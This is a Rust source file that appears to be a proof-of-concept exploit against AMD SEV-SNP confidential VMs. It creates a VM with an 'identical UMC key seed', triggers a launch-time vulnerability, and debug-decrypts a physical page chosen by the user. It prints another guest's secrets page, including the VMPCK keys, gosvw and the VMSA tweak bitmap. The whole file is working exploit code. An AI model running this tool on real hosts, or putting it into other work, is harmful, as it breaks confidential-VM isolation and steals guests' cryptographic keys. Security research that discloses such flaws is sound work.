use std::{
    fmt::{self, Display},
    sync::Arc,
};

use anyhow::{anyhow, Context, Result};
use bytemuck::checked::try_pod_read_unaligned;
use clap::Parser;
use kvm::KvmHandle;
use snp_types::{guest_policy::GuestPolicy, secrets::Secrets};

use crate::kvm::SevHandle;

mod kvm;
mod snp_types;

pub fn main() -> Result<()> {
    tracing_subscriber::fmt::init();

    let cli = Cli::parse();
    let pfn = cli.pfn.strip_prefix("0x").unwrap_or(&cli.pfn);
    let pfn = u64::from_str_radix(pfn, 16).context("failed to parse pfn")?;

    let kvm_handle = KvmHandle::new()?;
    let sev_handle = SevHandle::new()?;

    println!("Creating VM with identical UMC key seed");

    // Create a new VM.
    let vm = kvm_handle.create_snp_vm()?;
    let vm = Arc::new(vm);
    vm.sev_snp_init()?;

    // Start launch -> this also triggers the vulnerability.
    vm.sev_snp_launch_start(
        GuestPolicy::new(0, 0)
            .with_allow_smt(true)
            .with_allow_debugging(true),
        &sev_handle,
    )?;

    let buf = vm.sev_snp_dbg_decrypt(pfn)?;
    println!("Raw page:");
    let chunk_size = 32;
    for (i, chunk) in buf.chunks(chunk_size).enumerate() {
        let off = i * chunk_size;
        println!("{off:03x}: {}", HexBytes(chunk));
    }

    println!();
    if let Ok(secrets) =
        try_pod_read_unaligned(&buf).map_err(|_| anyhow!("couldn't decode secrets"))
    {
        let Secrets::V3(secrets) = secrets;
        println!("Secrets page:");
        println!("imi_en: {}", secrets.imi_en);
        println!("FMS: {:08x}", secrets.fms);
        println!("gosvw: {}", HexBytes(&secrets.gosvw));
        println!("vmpck0: {}", HexBytes(&secrets.vmpck0));
        println!("vmpck1: {}", HexBytes(&secrets.vmpck1));
        println!("vmpck2: {}", HexBytes(&secrets.vmpck2));
        println!("vmpck3: {}", HexBytes(&secrets.vmpck3));
        println!(
            "VMSA tweak bitmap: {}",
            HexBytes(&secrets.vmsa_tweak_bitmap.bitmap)
        );
        println!("tsc_factor: {}", secrets.tsc_factor);
    } else {
        println!("Couldn't decode as secrets page.");
    }

    Ok(())
}

#[derive(Parser)]
struct Cli {
    /// Physical frame number of the memory that should be decrypted.
    ///
    /// Example: 0x1b480a
    #[arg(long)]
    pfn: String,
}

struct HexBytes<'a>(&'a [u8]);

impl Display for HexBytes<'_> {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        for b in self.0 {
            write!(f, "{b:02x?}")?;
        }
        Ok(())
    }
}
